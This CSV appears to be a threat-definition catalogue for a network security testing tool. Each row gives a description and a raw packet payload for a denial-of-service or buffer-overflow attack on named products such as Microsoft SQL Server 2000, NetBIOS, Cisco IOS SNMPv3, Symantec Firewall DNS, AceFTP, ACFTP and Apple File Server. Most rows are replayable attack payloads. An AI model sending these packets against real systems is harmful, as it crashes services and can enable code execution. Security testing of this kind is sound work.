XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿MS_SMS_DoS.xml,Microsoft SMS Denial of Service,This threat is executed by sending this crafted packet to port 2702 which will result in the SMS client to throw an exception and crash.,SMS,TCP,RCH0####RCHEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
﻿MSsqlDoS.xml,MS02-039 MS SQL Server 2000 UDP Ping Flood,MS SQL Server 2000 employs UDP Port 1434 for foreign hosts to ping for connectivity. Sending a UDP packet with a specific payload to the port will result in the server responding with a ping reply. This threat may be executed by sending a flood of UDP packets from a falsified source or finding another vulnerable MS SQL Server and using it as the source causing the two servers to ping each other resulting in a denial of service. ,MSSQL,UDP,||0A||
﻿Netbios_UDP_DOS.xml,NetBIOS Denial of Service (WinNuke),This threat sends a large amount of data at UDP port 137.  Causes older implementations of Microsoft Windows to use 100% CPU and crash the NetBIOS service.,NETBIOS_NS,UDP,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||0a||
﻿SNMPv3catDoS.xml,Cisco SNMPv3 Denial of Service,This threat sends an SNMPv3 message to the target on port 162. Can cause various versions of IOS to crash.,SNMPv3,UDP,0g||02 01 03 ||0||11 02 04 ||hX||0e d5 02 03 00 ff e3 04 01 04 02 01 03 04 22 ||0 ||04 0c 00 00 00 00 00 00 00 00 12 ||4Vx||02 01 00 02 01 05 04 06 ||pub||6c ||ic||04 00 04 00 ||0||2b 04 0c 00 00 00 00 00 00 00 00 12 ||4Vx||04 00 a1 19 02 04 2a 0b ||IT||02 01 00 02 01 00 ||0||0b ||0||09 06 05 2b 06 01 02 01 05 00||
﻿SymantecFirewallDNSDOS.xml,Symantec Firewall DNS Response Denial of Service,"This threat sends a DNS packet where the compressed name pointer points back to itself, causing various Symantec Firewall applications to cause the kernel to go into an infinite loop.",DNS,UDP,||DF B2 80 00 00 01 00 01 00 00 00 00 C0 0C||
﻿SymantecFirewallDNSDOS2.xml,Symantec Firewall DNS Response Buffer Overflow,"This threat sends a large DNS reply to a an open UDP port - such as 137. The Symantec firewall software will attempt to read the DNS packet, and overflow a buffer it has allocated for to read it. Can be used for remote execution of code.",DNS,UDP,||00 01 81 80 00 01 00 01 00 00 00 00 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 06 ||g||6f 6f ||g||6c ||e||03 ||c||6f 6d 00 00 01 00 01 c0 0c 00 01 00 01 00 01 4f 4f 00 04 82 ||Q@||12 00||
﻿UDPport0DoS.xml,UDP Port 0 DoS,This threat is executed by sending the targeted host a UDP packet to port 0 causing either the firewall or remote host to crash. This will result in a denial of service.,UDP,UDP,||AA AA AA AA||
﻿WinXPdos.xml,Windows XP UDP Flood DoS,"This threat takes advantage of a vulnerability in Microsoft Windows XP. By default, UDP port 500 is accessible. Sending a large volume of traffic to that port will exhaust all CPU resources causing a denial of service for other remote users and locking up the machine for the local user.",UDP,UDP,||AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA||
﻿aceftp_dos.xml,Ace-FTP Client 1.24a Remote Buffer Overflow Proof of Concept,"This threat uses a malicious ftp server to send a large buffer to  any connecting AceFTP clients, causing a denial of service condition. AceFTP client typically connects to ftp port 21.",FTP,TCP,USER anonymous||0D 0A||
aceftp_dos.xml,Ace-FTP Client 1.24a Remote Buffer Overflow Proof of Concept,"This threat uses a malicious ftp server to send a large buffer to  any connecting AceFTP clients, causing a denial of service condition. AceFTP client typically connects to ftp port 21.",FTP,TCP,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDDDEEEECCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
﻿acftp_dos.xml,ACFTP FTP Server User Command Remote Denial of Service Vulnerability,This threat exploits a flaw in the way ACFTP Server parses certain characters in user commands that can cause a denial of service condition. ACFTP server typically listens on port 21.,FTP,TCP,USER anonymous||0D 0A||
acftp_dos.xml,ACFTP FTP Server User Command Remote Denial of Service Vulnerability,This threat exploits a flaw in the way ACFTP Server parses certain characters in user commands that can cause a denial of service condition. ACFTP server typically listens on port 21.,FTP,TCP,PASS anonymous||0D 0A||
acftp_dos.xml,ACFTP FTP Server User Command Remote Denial of Service Vulnerability,This threat exploits a flaw in the way ACFTP Server parses certain characters in user commands that can cause a denial of service condition. ACFTP server typically listens on port 21.,FTP,TCP,REST {}*{{}*{{}*{{}*{{}*{{}*{{}*{{}*{{}*{{}*{||0D 0A||
acftp_dos.xml,ACFTP FTP Server User Command Remote Denial of Service Vulnerability,This threat exploits a flaw in the way ACFTP Server parses certain characters in user commands that can cause a denial of service condition. ACFTP server typically listens on port 21.,FTP,TCP,220 Spire||6e ||tFTPD Server (We||6c ||c||6f 6d ||e t||6f || b||6c ||aster) ||5b 3a 3a ||ffff||3a ||59||2e ||31||2e ||131||2e ||44||5d 0d 0a||
acftp_dos.xml,ACFTP FTP Server User Command Remote Denial of Service Vulnerability,This threat exploits a flaw in the way ACFTP Server parses certain characters in user commands that can cause a denial of service condition. ACFTP server typically listens on port 21.,FTP,TCP,331 Passw||6f ||rd required||0d 0a||
acftp_dos.xml,ACFTP FTP Server User Command Remote Denial of Service Vulnerability,This threat exploits a flaw in the way ACFTP Server parses certain characters in user commands that can cause a denial of service condition. ACFTP server typically listens on port 21.,FTP,TCP,230 User ||6c 6f ||gged i||6e 2e 0d 0a||
﻿acunetix_wvs_dos.xml,Acunetix Web Vulnerability Scanner Remote Denial of Service Vulnerability,"This threat sends a series of HTTP GET requests with an invalid ""Content-Length"" value. Acunetix Web Vulnerability Scanner is a web application that typically listens on port 80 or 8080.",HTTP,TCP,GET / HTTP/1.0||0D 0A ||Content-Length||3A || die!!!||0D 0A 0D 0A ||GET / HTTP/1.0||0D 0A ||Content-Length||3A || die!!!||0D 0A 0D 0A ||GET / HTTP/1.0||0D 0A ||Content-Length||3A || die!!!||0D 0A 0D 0A ||GET / HTTP/1.0||0D 0A ||Content-Length||3A || die!!!||0D 0A 0D 0A ||GET / HTTP/1.0||0D 0A ||Content-Length||3A || die!!!||0D 0A 0D 0A ||GET / HTTP/1.0||0D 0A ||Content-Length||3A || die!!!||0D 0A 0D 0A ||GET / HTTP/1.0||0D 0A ||Content-Length||3A || die!!!||0D 0A 0D 0A ||GET / HTTP/1.0||0D 0A ||Content-Length||3A || die!!!||0D 0A 0D 0A||
acunetix_wvs_dos.xml,Acunetix Web Vulnerability Scanner Remote Denial of Service Vulnerability,"This threat sends a series of HTTP GET requests with an invalid ""Content-Length"" value. Acunetix Web Vulnerability Scanner is a web application that typically listens on port 80 or 8080.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿adodb_dos.xml,ADODB tmssql.php Denial of service (win32),"This threat sends a standard HTTP query which causes ADOdb to attempt to close a file descriptor which has not yet been initialized, causing windows to raise an exception. ADOdb typically listens on port 80.",HTTP,TCP,GET /some_app/include/adodb/tests/tmssql.php?do=closelog HTTP/1.0||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Host||3A || www.example.com||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
adodb_dos.xml,ADODB tmssql.php Denial of service (win32),"This threat sends a standard HTTP query which causes ADOdb to attempt to close a file descriptor which has not yet been initialized, causing windows to raise an exception. ADOdb typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿afp_dos.xml,Apple File Server Integer Overflow,"This threat causes an integer overflow in the Apple File Server daemon.  This creates a denial of service condition, preventing legitimate users from sharing files.  The Apple File Server typically listens on port 548.",AFP,TCP,||00 02 00 02 00 00 00 00 00 00 04 ||4||00 00 00 00 ||?||00 00 00 04 ||nemo||0F FF ||ppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp||FF FF ||ppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp||00 F0 ||pppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp||11 ||Tnemo||FF ||AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||FF ||BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB||00||
﻿allegro_dos.xml,Allegro Denial Of Service,This threat sends an HTTP GET request with a 1024 byte buffer for the Authenticate field.,HTTP,TCP,GET / HTTP/1.1||0D 0A ||Host||3A || localhost||0D 0A ||Authenticate||3A || AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||0D 0A 0D 0A||
allegro_dos.xml,Allegro Denial Of Service,This threat sends an HTTP GET request with a 1024 byte buffer for the Authenticate field.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
